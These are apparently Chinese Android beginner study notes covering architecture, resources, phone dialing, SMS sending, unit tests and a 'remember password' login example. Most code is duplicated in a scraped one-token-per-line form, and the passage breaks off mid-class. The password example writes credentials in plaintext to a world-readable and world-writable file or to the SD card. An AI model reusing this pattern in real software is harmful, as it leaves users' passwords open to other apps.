apk包可以直接用好压解压



-----------
Android系统今后将继续 每半年一次 的升级步伐，分别定在每年的 夏天和年终 。每代Android系统都 将以甜点命名.

1.5   -api 3
1.6        4
2.1        7
2.2        8
4.0        14
4.0.3      15


开源是双刃剑,有着大量的人才和公司资源.但另一方面,代码不集中,就像分裂的linux一样.
但是google也有他自己给予开发商的约束： cts测试
这是google程序员自己编写的测试case.其目的就是不让我们的开发商对代码的结构做太大变化的修改，如果说测试case不能通过，那么我们的这个操作系统就无法得到google的认证.


 每层功能简要介绍如下：
      一 应用程序层
      该层提供一些核心应用程序包，例如电子邮件、短信、日历、地图、浏览器和联系人管理等。同时，开发者可以利用Java语言设计和编写属于自己的应用程序，而这些程序与那些核心应用程序彼此平等、友好共处。
     二 应用程序框架层
     该层是Android应用开发的基础，开发人员大部分情况是在和她打交道。应用程序框架层包括活动管理器、窗口管理器、内容提供者、视图系统、包管理器、电话管理器、资源管理器、位置管理器、通知管理器和XMPP服务十个部分。在Android平台上，开发人员可以完全访问核心应用程序所使用的API框架。并且，任何一个应用程序都可以发布自身的功能模块，而其他应用程序则可以使用这些已发布的功能模块。基于这样的重用机制，用户就可以方便地替换平台本身的各种应用程序组件。
 
     三 系统库和Android运行时
     系统库包括九个子系统，分别是图层管理、媒体库、SQLite、OpenGLEState、FreeType、WebKit、SGL、SSL和libc。Android运行时包括核心库和Dalvik虚拟机，前者既兼容了大多数Java语言所需要调用的功能函数，又包括了Android的核心库，比如android.os、android.net、android.media等等。后者是一种基于寄存器的java虚拟机，Dalvik虚拟机主要是完成对生命周期的管理、堆栈的管理、线程的管理、安全和异常的管理以及垃圾回收等重要功能。
 
     四 Linux内核
     Android核心系统服务依赖于Linux2.6内核，如安全性、内存管理、进程管理、网络协议栈和驱动模型。Linux内核也是作为硬件与软件栈的抽象层。驱动：显示驱动、摄像头驱动、键盘驱动、WiFi驱动、Audio驱动、flash内存驱动、Binder（IPC）驱动、电源管理等。
 
     总结：
     1 Android的系统架构采用分层架构的思想，架构清晰，层次分明，协同工作。
 
     2 Android的系统架构不仅从宏观上认识了Android系统，同时，也给我们的学习与实践指明了方向。若是从事Android应用开发，那应该研究Android的应用框架层和应用程序层；若是从事Android系统开发，那应该研究Android的系统库和Android运行时；若是从事Android驱动开发，那应该研究Android的Linux内核。总之，找准切入点，实践出真知。


Dalvik是google公司开发的针对移动设备的java虚拟机



  




【项目目录结构】

gen/ 自动生成目录
gen 目录中存放所有由Android开发工具自动生成的文件。目录中最重要的就是R.java文件。 这个文件由Android开发工具自动产生的。Android开发工具会自动根据你放入res目录的资源，同步更新修改R.java文件。正因为R.java文件是由开发工具自动生成的，所以我们应避免手工修改R.java。R.java在应用中起到了字典的作用，它包含了各种资源的id，通过R.java，应用可以很方便地找到对应资源。另外编绎器也会检查R.java列表中的资源是否被使用到，没有被使用到的资源不会编绎进软件中，这样可以减少应用在手机占用的空间。
res/ 资源(Resource)目录
在这个目录中我们可以存放应用使用到的各种资源，如xml界面文件，图片或数据。
assets 资源目录
Android除了提供/res目录存放资源文件外，在/assets目录也可以存放资源文件，而且/assets目录下的资源文件 不会在R.java自动生成ID ，所以读取/assets目录下的文件必须指定文件的路径，如：file:///android_asset/xxx.3gp
AndroidManifest.xml 项目清单文件
 这个文件列出了 应用程序所提供的功能 ，以后你开发好的各种组件需要在该文件中进行配置，如果应用使用到了系统内置的应用(如电话服务、互联网服务、短信服务、GPS服务等等)，你还需在该文件中声明使用权限。
default.properties 项目环境信息，一般是不需要修改此文件
-----------------
res/drawable 专门存放png、jpg等图标文件。在代码中使用getResources().getDrawable(resourceId)获取该目录下的资源。
res/layout 专门存放xml界面文件，xml界面文件和HTML文件一样，主要用于显示用户操作界面。
res/values 专门存放应用使用到的各种类型数据。不同类型的数据存放在不同的文件中，如下：
· strings.xml 定义字符串和数值，在Activity中使用getResources().getString(resourceId) 或getResources().getText(resourceId)取得资源。
<?xml version="1.0" encoding="UTF-8"?>
<resources>
  <string name="itcast">传智播客</string>
</resources>


· arrays.xml 定义数组。
<?xml version="1.0" encoding="utf-8"?>
<resources>
<string-array name="colors">
<item>red</item>
<item>yellow</item>     
<item>green</item>     
<item>blue</item>   
</string-array>
</resources>


· colors.xml 定义颜色和颜色字串数值，你可以在Activity中使用getResources().getDrawable(resourceId) 以及getResources().getColor(resourceId)取得这些资源。例子如下：
 <?xml version="1.0" encoding="UTF-8"?>
<resources>
  <color name="contents_text">#ff0000</color>
</resources>


· dimens.xml 定义尺寸数据，在Activity中使用getResources().getDimension(resourceId) 取得这些资源
 <?xml version="1.0" encoding="UTF-8"?>
<resources>
  <dimen name="key_height">50dip</dimen>
</resources>


· styles.xml 定义样式。
<?xml version="1.0" encoding="utf-8"?>
<resources>
<style name="itcastText" parent="@style/Text">
<item name="android:textSize">18sp</item>
<item name="android:textColor">#0066FF</item>
</style>
</resources> 


res/anim/ 存放定义动画的XML文件。
res/xml/ 在Activity中使用getResources().getXML()读取该目录下的XML资源文件。
res/raw/ 该目录用于存放应用使用到的原始文件，如音效文件等。编译软件时，这些数据不会被编译，它们被直接加入到程序安装包里。 为了在程序中使用这些资源，你可以调用getResources().openRawResource(ID) , 参数ID形式：R.raw.somefilename。
---------------------------------------
9 adb pull <remote> <local>       文件的复制
10 adb push <local> <remote>
----------------------------------------
<uses-permission android:name="android.permission.CALL_PHONE"/>


LinearLayout (线性布局)、AbsoluteLayout(绝对布局)、RelativeLayout(相对布局)、TableLayout(表格布局)、FrameLayout(帧布局)



 px (pixels)像素 
     一般HVGA代表320x480像素，这个用的比较多。


 dip或dp (device independent pixels)设备独立像素
    这个和设备硬件有关，一般为了支持WVGA、HVGA和QVGA 推荐使用这个，不依赖像素。


 sp (scaled pixels — best for text size)比例像素
    主要处理字体的大小，可以根据系统的字体自适应。
为了适应不同分辨率，不同的像素密度，推荐使用dip ，文字使用sp。



Activity是Android组件中最基本也是最为常见用的四大组件（Activity， Service 服务， Content Provider 内容提供者，BroadcastReceiver广播接收器）之一。

---------------------------三种不同的点击事件------------------
public class MainActivity extends Activity implements OnClickListener { public static final String tag ="MainActivity"; private  EditText mEditText;     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         // 得到了 activity界面上button的引用          Button button = (Button) this.findViewById(R.id.bt_dail);     	mEditText = (EditText) MainActivity.this.findViewById(R.id.et_number);     /*   button.setOnClickListener(new OnClickListener() {          	// 方法二 :通过匿名内部类的方式实现点击事件  @Override public void onClick(View v) {  String number = mEditText.getText().toString(); Log.i(tag,number); Log.i(tag,"匿名内部类"); //播打电话号码  Intent intent = new Intent(); // 意图 代表一个要执行动作的意图  //拨打动作   110 代表的是一个数据  intent.setAction(Intent.ACTION_CALL); intent.setData(Uri.parse("tel:"+number));  //android里面  startActivity(intent); } });*/         	// button.setOnClickListener(this);         }               /**      * 第一种写法       * @author zehua      *      */     private  class MyButtonClickListener implements OnClickListener{     	// 在某一个view对象  被点击的时候 调用的回调方法  @Override public void onClick(View v) {   String number = mEditText.getText().toString(); Log.i(tag,number); //播打电话号码  Intent intent = new Intent(); // 意图 代表一个要执行动作的意图  //拨打动作   110 代表的是一个数据  intent.setAction(Intent.ACTION_CALL); intent.setData(Uri.parse("tel:"+number));  //android里面  startActivity(intent); }         }       // 按钮对应的点击事件      // 参数 v 代表的就是当前被点击的条目对应的view对象  @Override public void onClick(View v) { switch (v.getId()) { case R.id.bt_dail: //相应按钮的点击事件   String number = mEditText.getText().toString(); Log.i(tag,number); //播打电话号码  Intent intent = new Intent(); // 意图 代表一个要执行动作的意图  //拨打动作   110 代表的是一个数据  intent.setAction(Intent.ACTION_CALL); intent.setData(Uri.parse("tel:"+number));  //android里面  startActivity(intent); break;    }  }      /** * 定义 xml布局文件里面 button 绑定的点击事件的方法  * @param view */     public void dail(View view){     	String number = mEditText.getText().toString(); Log.i(tag,number); //播打电话号码  Intent intent = new Intent(); // 意图 代表一个要执行动作的意图  //拨打动作   110 代表的是一个数据  intent.setAction(Intent.ACTION_CALL); intent.setData(Uri.parse("tel:"+number));  //android里面  startActivity(intent);     }      public void textview_click(View view){     	Log.i(tag,"文本被点击了");     } }

107
 
1
public
 
class
 
MainActivity
 
extends
 
Activity
 
implements
 
OnClickListener
 {
2
    
public
 
static
 
final
 
String
 
tag
 
=
"MainActivity"
;
3
    
private
  
EditText
 
mEditText
;
4
    
@Override
5
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
6
        
super
.
onCreate
(
savedInstanceState
);
7
        
setContentView
(
R
.
layout
.
main
);
8
        
// 得到了 activity界面上button的引用 
9
        
Button
 
button
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
bt_dail
);
10
    
    
mEditText
 
=
 (
EditText
) 
MainActivity
.
this
.
findViewById
(
R
.
id
.
et_number
);
11
    
/*   button.setOnClickListener(new OnClickListener() {
12
    
    
    
13
        
    
// 方法二 :通过匿名内部类的方式实现点击事件 
14
    
    
    
@Override
15
    
    
    
public void onClick(View v) {
16
    
    
    
    
17
    
    
    
    
String number = mEditText.getText().toString();
18
    
    
    
    
Log.i(tag,number);
19
    
    
    
    
Log.i(tag,"匿名内部类");
20
    
    
    
    
//播打电话号码 
21
    
    
    
    
Intent intent = new Intent(); // 意图 代表一个要执行动作的意图 
22
    
    
    
    
//拨打动作   110 代表的是一个数据 
23
    
    
    
    
intent.setAction(Intent.ACTION_CALL);
24
    
    
    
    
intent.setData(Uri.parse("tel:"+number));
25
    
    
    
    
26
    
    
    
    
//android里面 
27
    
    
    
    
startActivity(intent);
28
    
    
    
}
29
    
    
});*/
30
    
    
31
    
    
// button.setOnClickListener(this);
32
    
    
33
    }
34
    
35
    
36
    
/**
37
     
* 第一种写法 
38
     
* @author zehua
39
     
*
40
     
*/
41
    
private
  
class
 
MyButtonClickListener
 
implements
 
OnClickListener
{
42
    
    
// 在某一个view对象  被点击的时候 调用的回调方法 
43
    
    
@Override
44
    
    
public
 
void
 
onClick
(
View
 
v
) {
45
    
    
    
46
    
    
47
    
    
    
String
 
number
 
=
 
mEditText
.
getText
().
toString
();
48
    
    
    
Log
.
i
(
tag
,
number
);
49
    
    
    
//播打电话号码 
50
    
    
    
Intent
 
intent
 
=
 
new
 
Intent
(); 
// 意图 代表一个要执行动作的意图 
51
    
    
    
//拨打动作   110 代表的是一个数据 
52
    
    
    
intent
.
setAction
(
Intent
.
ACTION_CALL
);
53
    
    
    
intent
.
setData
(
Uri
.
parse
(
"tel:"
+
number
));
54
    
    
    
55
    
    
    
//android里面 
56
    
    
    
startActivity
(
intent
);
57
    
    
}
58
    
    
59
    }
60
61
62
    
// 按钮对应的点击事件 
63
    
// 参数 v 代表的就是当前被点击的条目对应的view对象 
64
    
@Override
65
    
public
 
void
 
onClick
(
View
 
v
) {
66
    
    
switch
 (
v
.
getId
()) {
67
    
    
case
 
R
.
id
.
bt_dail
:
68
    
    
    
//相应按钮的点击事件 
69
70
    
    
    
String
 
number
 
=
 
mEditText
.
getText
().
toString
();
71
    
    
    
Log
.
i
(
tag
,
number
);
72
    
    
    
//播打电话号码 
73
    
    
    
Intent
 
intent
 
=
 
new
 
Intent
(); 
// 意图 代表一个要执行动作的意图 
74
    
    
    
//拨打动作   110 代表的是一个数据 
75
    
    
    
intent
.
setAction
(
Intent
.
ACTION_CALL
);
76
    
    
    
intent
.
setData
(
Uri
.
parse
(
"tel:"
+
number
));
77
    
    
    
78
    
    
    
//android里面 
79
    
    
    
startActivity
(
intent
);
80
    
 
   
    
break
;
81
82
 
83
    
    
}
84
    
    
85
    
}
86
    
87
    
/**
88
    
 
* 定义 xml布局文件里面 button 绑定的点击事件的方法 
89
    
 
* @param view
90
    
 
*/
91
    
public
 
void
 
dail
(
View
 
view
){
92
    
    
String
 
number
 
=
 
mEditText
.
getText
().
toString
();
93
    
    
Log
.
i
(
tag
,
number
);
94
    
    
//播打电话号码 
95
    
    
Intent
 
intent
 
=
 
new
 
Intent
(); 
// 意图 代表一个要执行动作的意图 
96
    
    
//拨打动作   110 代表的是一个数据 
97
    
    
intent
.
setAction
(
Intent
.
ACTION_CALL
);
98
    
    
intent
.
setData
(
Uri
.
parse
(
"tel:"
+
number
));
99
    
    
100
    
    
//android里面 
101
    
    
startActivity
(
intent
);
102
    }
103
    
104
    
public
 
void
 
textview_click
(
View
 
view
){
105
    
    
Log
.
i
(
tag
,
"文本被点击了"
);
106
    }
107
}
<Button android:layout_width="wrap_content"
        android:text="@string/submit"
        android:layout_height="wrap_content"
        android:onClick="sendMessage"
        android:id="@+id/button_send"/>
 
public class MyActivity extends Activity {
    public final static String EXTRA_MESSAGE="com.example.myapp";
 
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        //得到按钮实例
        Button hellobtn = (Button) findViewById(R.id.button_send);
        //设置监听按钮点击事件
        hellobtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MyActivity.this, DisplayMessageActivity.class);
                EditText editText =(EditText)findViewById(R.id.edit_message);
                String message=editText.getText().toString();
                intent.putExtra(EXTRA_MESSAGE,message);
                startActivity(intent);
            }
        });
    }
 
    public void sendMessage(View view) {
        Intent intent = new Intent(this, DisplayMessageActivity.class);
        EditText editText =(EditText)findViewById(R.id.edit_message);
        String message=editText.getText().toString();
        intent.putExtra(EXTRA_MESSAGE,message);
        startActivity(intent);
    }
}


-------------------------------发短信--------------
public class MainActivity extends Activity { private static final String TAG = "MainActivity"; private EditText mEtNumber; private EditText mEtContent;        @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main6);         mEtContent = (EditText) this.findViewById(R.id.et_content);         mEtNumber = (EditText) this.findViewById(R.id.et_number);              }                    public void send(View view){     	String number = mEtNumber.getText().toString().trim();     	String content = mEtContent.getText().toString().trim();     	if("".equals(number)||"".equals(content)){     		//提示用户 短信的接收人 或者 内容不能为空      		// 上下文 其实就是一个全局的对象       		Toast.makeText(this, R.string.error_message, Toast.LENGTH_LONG).show();     		return ;     	}else{     		Log.i(TAG,"发送短信  接受者"+number+" 内容"+content);     		SmsManager smsmanager = SmsManager.getDefault();     		//sentIntent, deliveryIntent延期的意图 ,      		// sentintent 发送报告      		// deliveryIntent 送达报告      		//smsmanager.sendTextMessage(number, null, content, null, null);         		//一条短信最大的文本长度 是多少 ?      		// 中文 70 汉字  英文 160字符     		ArrayList<String> messages = smsmanager.divideMessage(content);   //超过70字要拆分     		for(String message : messages){     			smsmanager.sendTextMessage(number, null, message, null, null);     		}     	}     } }

43
 
1
public
 
class
 
MainActivity
 
extends
 
Activity
 {
2
    
private
 
static
 
final
 
String
 
TAG
 
=
 
"MainActivity"
;
3
    
private
 
EditText
 
mEtNumber
;
4
    
private
 
EditText
 
mEtContent
;
5
    
6
    
7
    
8
    
@Override
9
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
10
        
super
.
onCreate
(
savedInstanceState
);
11
        
setContentView
(
R
.
layout
.
main6
);
12
        
mEtContent
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_content
);
13
        
mEtNumber
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_number
);
14
        
15
    }
16
    
17
    
18
    
19
    
public
 
void
 
send
(
View
 
view
){
20
    
    
String
 
number
 
=
 
mEtNumber
.
getText
().
toString
().
trim
();
21
    
    
String
 
content
 
=
 
mEtContent
.
getText
().
toString
().
trim
();
22
    
    
if
(
""
.
equals
(
number
)
||
""
.
equals
(
content
)){
23
    
    
    
//提示用户 短信的接收人 或者 内容不能为空 
24
    
    
    
// 上下文 其实就是一个全局的对象  
25
    
    
    
Toast
.
makeText
(
this
, 
R
.
string
.
error_message
, 
Toast
.
LENGTH_LONG
).
show
();
26
    
    
    
return
 ;
27
    
    
}
else
{
28
    
    
    
Log
.
i
(
TAG
,
"发送短信  接受者"
+
number
+
" 内容"
+
content
);
29
    
    
    
SmsManager
 
smsmanager
 
=
 
SmsManager
.
getDefault
();
30
    
    
    
//sentIntent, deliveryIntent延期的意图 , 
31
    
    
    
// sentintent 发送报告 
32
    
    
    
// deliveryIntent 送达报告 
33
    
    
    
//smsmanager.sendTextMessage(number, null, content, null, null);
34
    
    
    
35
    
    
    
//一条短信最大的文本长度 是多少 ? 
36
    
    
    
// 中文 70 汉字  英文 160字符
37
    
    
    
ArrayList
<
String
>
 
messages
 
=
 
smsmanager
.
divideMessage
(
content
);   
//超过70字要拆分
38
    
    
    
for
(
String
 
message
 : 
messages
){
39
    
    
    
    
smsmanager
.
sendTextMessage
(
number
, 
null
, 
message
, 
null
, 
null
);
40
    
    
    
}
41
    
    
}
42
    }
43
}
<manifest xmlns:android="http://schemas.android.com/apk/res/android"       //单元测试           package="com.example.sqllite"           android:versionCode="1"           android:versionName="1.0">     <instrumentation android:name="android.test.InstrumentationTestRunner"                      android:targetPackage="com.example.sqllite"                      android:label="Tests for com.example.sqllite"/>     <uses-sdk android:targetSdkVersion="15" android:minSdkVersion="13"/>     <application android:label="@string/app_name" android:icon="@drawable/ic_launcher">         <uses-library android:name="android.test.runner"/>         <activity android:name="MyActivity"                   android:label="@string/app_name">             <intent-filter>                 <action android:name="android.intent.action.MAIN"/>                 <category android:name="android.intent.category.LAUNCHER"/>             </intent-filter>         </activity>     </application> </manifest>

19
 
1
<
manifest
 
xmlns:android
=
"http://schemas.android.com/apk/res/android"
       
//单元测试
 
2
          
package
=
"com.example.sqllite"
3
          
android:versionCode
=
"1"
4
          
android:versionName
=
"1.0"
>
5
    
<
instrumentation
 
android:name
=
"android.test.InstrumentationTestRunner"
6
                     
android:targetPackage
=
"com.example.sqllite"
7
                     
android:label
=
"Tests for com.example.sqllite"
/>
8
    
<
uses-sdk
 
android:targetSdkVersion
=
"15"
 
android:minSdkVersion
=
"13"
/>
9
    
<
application
 
android:label
=
"@string/app_name"
 
android:icon
=
"@drawable/ic_launcher"
>
10
        
<
uses-library
 
android:name
=
"android.test.runner"
/>
11
        
<
activity
 
android:name
=
"MyActivity"
12
                  
android:label
=
"@string/app_name"
>
13
            
<
intent-filter
>
14
                
<
action
 
android:name
=
"android.intent.action.MAIN"
/>
15
                
<
category
 
android:name
=
"android.intent.category.LAUNCHER"
/>
16
            
</
intent-filter
>
17
        
</
activity
>
18
    
</
application
>
19
</
manifest
>
public class TestCalcService extends AndroidTestCase {  public void testAdd() throws Exception{ // 把程序出现的例外 抛给测试框架  CalcService service = new CalcService(); int result = service.add(3, 5); assertEquals(9, result); } public void testSub() throws Exception{ // 把程序出现的例外 抛给测试框架  CalcService service = new CalcService(); int result = service.sub(3, 5); assertEquals(-2, result); } /** * 测试类 TestCalcService 在第一次被创建的时候 , * 做一些初始化全局变量的操作  */ @Override protected void setUp() throws Exception {  super.setUp(); } /** * 测试类 TestCalcService 在被销毁的时候 , * 做一些擦屁股的操作  */ @Override protected void tearDown() throws Exception { super.tearDown(); }  public void testSDsize() throws Exception{       File path = Environment.getExternalStorageDirectory();         StatFs stat = new StatFs(path.getPath());         long blockSize = stat.getBlockSize();         long totalBlocks = stat.getBlockCount();         long totalbytes =  blockSize*totalBlocks;         System.out.println(totalbytes); } }

39
 
1
public
 
class
 
TestCalcService
 
extends
 
AndroidTestCase
 {
2
3
    
public
 
void
 
testAdd
() 
throws
 
Exception
{ 
// 把程序出现的例外 抛给测试框架 
4
    
    
CalcService
 
service
 
=
 
new
 
CalcService
();
5
    
    
int
 
result
 
=
 
service
.
add
(
3
, 
5
);
6
    
    
assertEquals
(
9
, 
result
);
7
    
}
8
    
public
 
void
 
testSub
() 
throws
 
Exception
{ 
// 把程序出现的例外 抛给测试框架 
9
    
    
CalcService
 
service
 
=
 
new
 
CalcService
();
10
    
    
int
 
result
 
=
 
service
.
sub
(
3
, 
5
);
11
    
    
assertEquals
(
-
2
, 
result
);
12
    
}
13
    
/**
14
    
 
* 测试类 TestCalcService 在第一次被创建的时候 ,
15
    
 
* 做一些初始化全局变量的操作 
16
    
 
*/
17
    
@Override
18
    
protected
 
void
 
setUp
() 
throws
 
Exception
 {
19
    
    
20
    
    
super
.
setUp
();
21
    
}
22
    
/**
23
    
 
* 测试类 TestCalcService 在被销毁的时候 ,
24
    
 
* 做一些擦屁股的操作 
25
    
 
*/
26
    
@Override
27
    
protected
 
void
 
tearDown
() 
throws
 
Exception
 {
28
    
    
super
.
tearDown
();
29
    
}
30
    
31
    
public
 
void
 
testSDsize
() 
throws
 
Exception
{   
32
    
    
File
 
path
 
=
 
Environment
.
getExternalStorageDirectory
();
33
        
StatFs
 
stat
 
=
 
new
 
StatFs
(
path
.
getPath
());
34
        
long
 
blockSize
 
=
 
stat
.
getBlockSize
();
35
        
long
 
totalBlocks
 
=
 
stat
.
getBlockCount
();
36
        
long
 
totalbytes
 
=
  
blockSize
*
totalBlocks
;
37
        
System
.
out
.
println
(
totalbytes
);
38
    
}
   
39
}








-----------------------------------------------文件保存密码-----------------------------------
public class DemoActivity extends Activity implements OnClickListener { private EditText mEtName; private EditText mEtPwd; private Button mBtLogin; private CheckBox mCb;  @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); // 程序开发 使用一些临时的数据  File cacheDir =  this.getCacheDir();   mEtName = (EditText) this.findViewById(R.id.et_name); mEtPwd= (EditText) this.findViewById(R.id.et_pwd); mBtLogin = (Button) this.findViewById(R.id.bt_login); mCb = (CheckBox) this.findViewById(R.id.cb_remember_pwd); mBtLogin.setOnClickListener(this); // 默认的地址  /data/data/<包名>/ try { FileInputStream  fis  = this.openFileInput("config.txt"); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int len; while((len = fis.read(buffer))!=-1){ bos.write(buffer, 0, len); } byte[] result = bos.toByteArray(); String content = new String(result); // zhangsan: 123456 String[] array = content.split(":"); //把数据重新设置到文本框里面  mEtName.setText(array[0]); mEtPwd.setText(array[1]);   } catch (Exception e) { e.printStackTrace(); }  }  @Override public void onClick(View v) { switch (v.getId()) { case R.id.bt_login: if(mCb.isChecked()){ //保存用户名密码到持久化设备 SavePwdService service = new SavePwdService(this); String name = mEtName.getText().toString().trim(); String pwd = mEtPwd.getText().toString().trim(); //service.saveToRomFile(name, pwd);  //存到手机的sd卡里面 service.saveToSDcard(name, pwd); //	Toast.makeText(this, "保存成功....", Toast.LENGTH_LONG).show();  }else{ Toast.makeText(this, "登陆中....", Toast.LENGTH_LONG).show(); }   break; }  } }

68
 
1
public
 
class
 
DemoActivity
 
extends
 
Activity
 
implements
 
OnClickListener
 {
2
    
private
 
EditText
 
mEtName
;
3
    
private
 
EditText
 
mEtPwd
;
4
    
private
 
Button
 
mBtLogin
;
5
    
private
 
CheckBox
 
mCb
;
6
7
    
@Override
8
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
9
    
    
super
.
onCreate
(
savedInstanceState
);
10
    
    
setContentView
(
R
.
layout
.
main
);
11
    
    
// 程序开发 使用一些临时的数据 
12
    
    
File
 
cacheDir
 
=
  
this
.
getCacheDir
();
13
    
    
14
    
    
15
    
    
mEtName
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_name
);
16
    
    
mEtPwd
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_pwd
);
17
    
    
mBtLogin
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
bt_login
);
18
    
    
mCb
 
=
 (
CheckBox
) 
this
.
findViewById
(
R
.
id
.
cb_remember_pwd
);
19
    
    
mBtLogin
.
setOnClickListener
(
this
);
20
    
    
// 默认的地址  /data/data/<包名>/
21
    
    
try
 {
22
    
    
    
FileInputStream
  
fis
  
=
 
this
.
openFileInput
(
"config.txt"
);
23
    
    
    
ByteArrayOutputStream
 
bos
 
=
 
new
 
ByteArrayOutputStream
();
24
    
    
    
byte
[] 
buffer
 
=
 
new
 
byte
[
1024
];
25
    
    
    
int
 
len
;
26
    
    
    
while
((
len
 
=
 
fis
.
read
(
buffer
))
!=-
1
){
27
    
    
    
    
bos
.
write
(
buffer
, 
0
, 
len
);
28
    
    
    
}
29
    
    
    
byte
[] 
result
 
=
 
bos
.
toByteArray
();
30
    
    
    
String
 
content
 
=
 
new
 
String
(
result
);
31
    
    
    
// zhangsan: 123456
32
    
    
    
String
[] 
array
 
=
 
content
.
split
(
":"
);
33
    
    
    
//把数据重新设置到文本框里面 
34
    
    
    
mEtName
.
setText
(
array
[
0
]);
35
    
    
    
mEtPwd
.
setText
(
array
[
1
]);
36
    
    
    
37
    
    
    
38
    
    
} 
catch
 (
Exception
 
e
) {
39
    
    
    
e
.
printStackTrace
();
40
    
    
}
41
    
    
42
    
}
43
44
    
@Override
45
    
public
 
void
 
onClick
(
View
 
v
) {
46
    
    
switch
 (
v
.
getId
()) {
47
    
    
case
 
R
.
id
.
bt_login
:
48
    
    
    
if
(
mCb
.
isChecked
()){
49
    
    
    
    
//保存用户名密码到持久化设备
50
    
    
    
    
SavePwdService
 
service
 
=
 
new
 
SavePwdService
(
this
);
51
    
    
    
    
String
 
name
 
=
 
mEtName
.
getText
().
toString
().
trim
();
52
    
    
    
    
String
 
pwd
 
=
 
mEtPwd
.
getText
().
toString
().
trim
();
53
    
    
    
    
//service.saveToRomFile(name, pwd);
54
    
    
    
    
55
    
    
    
    
//存到手机的sd卡里面
56
    
    
    
    
service
.
saveToSDcard
(
name
, 
pwd
);
57
    
    
    
//
  
Toast.makeText(this, "保存成功....", Toast.LENGTH_LONG).show();
58
    
    
    
    
59
    
    
    
}
else
{
60
    
    
    
    
Toast
.
makeText
(
this
, 
"登陆中...."
, 
Toast
.
LENGTH_LONG
).
show
();
61
    
    
    
}
62
    
    
    
63
    
    
    
64
    
    
    
break
;
65
    
    
}
66
    
    
67
    
}
68
}
public class SavePwdService { //定义应用程序的上下文  没有被初始化  private Context context; public SavePwdService(Context context) { this.context = context; } /** * 保存用户密码到手机rom的文件里面  * @param name  * @param pwd  */ public void saveToRomFile(String name ,String pwd){ // 私有的权限 创建一个 config.txt的文件 并且获取到他的输出流  try { FileOutputStream  fos = context.openFileOutput("config.txt", Context.MODE_WORLD_WRITEABLE|Context.MODE_WORLD_READABLE); String content = name+":"+pwd; fos.write(content.getBytes()); fos.flush(); fos.close(); } catch (Exception e) { e.printStackTrace(); } } openFileOutput()方法的第一参数用于指定文件名称，不能包含路径分隔符“/” ，如果文件不存在，Android 会自动创建它。创建的文件保存在/data/data/<package name>/files目录，如： /data/data/cn.itcast.action/files/itcast.txt ， /** * 把数据存到手机的外存储设备上 sd卡  * @param name * @param pwd */ public void saveToSDcard(String name,String pwd){ try { // /sdcard/xxx.txt // /mnt/sdcard/xxx.txt // //excard/xxx.txt if(Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())){  File file = new File(Environment.getExternalStorageDirectory(),"newfile.txt"); FileOutputStream fos = new FileOutputStream(file); String content = name+":"+pwd; fos.write(content.getBytes()); fos.flush(); fos.close(); Toast.makeText(context, "保存成功", Toast.LENGTH_LONG).show(); }else{ Toast.makeText(context, "sd卡不可用请检查sd卡的状态", Toast.LENGTH_LONG).show(); }  } catch (Exception e) { Toast.makeText(context, "写sd卡数据失败", Toast.LENGTH_LONG).show(); e.printStackTrace(); } } Environment.getExternalStorageState()方法用于获取SDCard的状态，如果手机装有SDCard，并且可以进行读写，那么方法返回的状态等于Environment.MEDIA_MOUNTED。 Environment.getExternalStorageDirectory()方法用于获取SDCard的目录，当然要获取SDCard的目录，你也可以这样写： File sdCardDir = new File("/mnt/sdcard"); //获取SDCard目录 File saveFile = new File(sdCardDir, "itcast.txt"); //上面两句代码可以合成一句： File saveFile = new File("/mnt/sdcard/itcast.txt"); FileOutputStream outStream = new FileOutputStream(saveFile); outStream.write("传智播客test".getBytes()); outStream.close();  }

62
 
1
public
 
class
 
SavePwdService
 {
2
    
//定义应用程序的上下文  没有被初始化 
3
    
private
 
Context
 
context
;
4
    
public
 
SavePwdService
(
Context
 
context
) {
5
    
    
this
.
context
 
=
 
context
;
6
    
}
7
    
/**
8
    
 
* 保存用户密码到手机rom的文件里面 
9
    
 
* @param name 
10
    
 
* @param pwd 
11
    
 
*/
12
    
public
 
void
 
saveToRomFile
(
String
 
name
 ,
String
 
pwd
){
13
    
    
// 私有的权限 创建一个 config.txt的文件 并且获取到他的输出流 
14
    
    
try
 {
15
    
    
    
FileOutputStream
  
fos
 
=
 
context
.
openFileOutput
(
"config.txt"
, 
Context
.
MODE_WORLD_WRITEABLE
|
Context
.
MODE_WORLD_READABLE
);
16
    
    
    
String
 
content
 
=
 
name
+
":"
+
pwd
;
17
    
    
    
fos
.
write
(
content
.
getBytes
());
18
    
    
    
fos
.
flush
();
19
    
    
    
fos
.
close
();
20
    
    
} 
catch
 (
Exception
 
e
) {
21
    
    
    
e
.
printStackTrace
();
22
    
    
}
   
    
    
    
23
    
}
24
openFileOutput
()
方法的第一参数用于指定文件名称，不能包含路径分隔符“
/
”
 
，如果文件不存在，Android
 
会自动创建它。创建的文件保存在
/
data
/
data
/<
package
 
name
>/
files目录，如：
 
/
data
/
data
/
cn
.
itcast
.
action
/
files
/
itcast
.
txt
 
，
25
    
/**
26
    
 
* 把数据存到手机的外存储设备上 sd卡 
27
    
 
* @param name
28
    
 
* @param pwd
29
    
 
*/
30
    
public
 
void
 
saveToSDcard
(
String
 
name
,
String
 
pwd
){
31
    
    
try
 {
32
    
    
    
// /sdcard/xxx.txt
33
    
    
    
// /mnt/sdcard/xxx.txt
34
    
    
    
// //excard/xxx.txt 
    
35
    
    
    
if
(
Environment
.
MEDIA_MOUNTED
.
equals
(
Environment
.
getExternalStorageState
())){
36
    
    
